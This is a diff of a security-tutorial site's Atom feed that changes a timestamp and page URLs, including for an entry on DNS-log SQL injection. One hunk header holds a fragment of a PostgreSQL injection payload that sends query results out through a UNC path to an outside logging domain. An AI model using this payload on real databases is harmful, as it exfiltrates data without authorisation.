@@ -4,7 +4,7 @@
   <title><![CDATA[HackingDocs]]></title>
   <link href="http://docs.hackinglab.cn/atom.xml" rel="self"/>
   <link href="http://docs.hackinglab.cn/"/>
-  <updated>2015-08-01T17:50:15+08:00</updated>
+  <updated>2015-08-01T18:00:45+08:00</updated>
   <id>http://docs.hackinglab.cn/</id>
   <author>
     <name><![CDATA[]]></name>
@@ -15,9 +15,9 @@
   
   <entry>
     <title type="html"><![CDATA[HawkEye Log/Dns 在Sql注入中的应用]]></title>
-    <link href="http://docs.hackinglab.cn/14384161125871.html"/>
+    <link href="http://docs.hackinglab.cn/HawkEye-Log/Dns-Sqli.html"/>
     <updated>2015-08-01T16:01:52+08:00</updated>
-    <id>http://docs.hackinglab.cn/14384161125871.html</id>
+    <id>http://docs.hackinglab.cn/HawkEye-Log/Dns-Sqli.html</id>
     <content type="html"><![CDATA[
 <p><a href="http://hawkeye.hackinglab.cn/Index/Example.php">Hawkeye: http://hawkeye.hackinglab.cn/</a></p>
 
@@ -110,9 +110,9 @@ FROM E\&#39;\\\\\\\\&#39;||query_result||E&#39;.s.livesina.com\\\\foobar.txt\&#3
   
   <entry>
     <title type="html"><![CDATA[HackingDocs]]></title>
-    <link href="http://docs.hackinglab.cn/14384148316929.html"/>
+    <link href="http://docs.hackinglab.cn/Introduction.html"/>
     <updated>2015-08-01T15:40:31+08:00</updated>
-    <id>http://docs.hackinglab.cn/14384148316929.html</id>
+    <id>http://docs.hackinglab.cn/Introduction.html</id>
     <content type="html"><![CDATA[
 <p><a href="http://docs.hackinglab.cn/">HackingDocs: http://docs.hackinglab.cn/</a><br/>
 <a href="http://hackinglab.cn/">HackingLab: http://hackinglab.cn/</a></p>
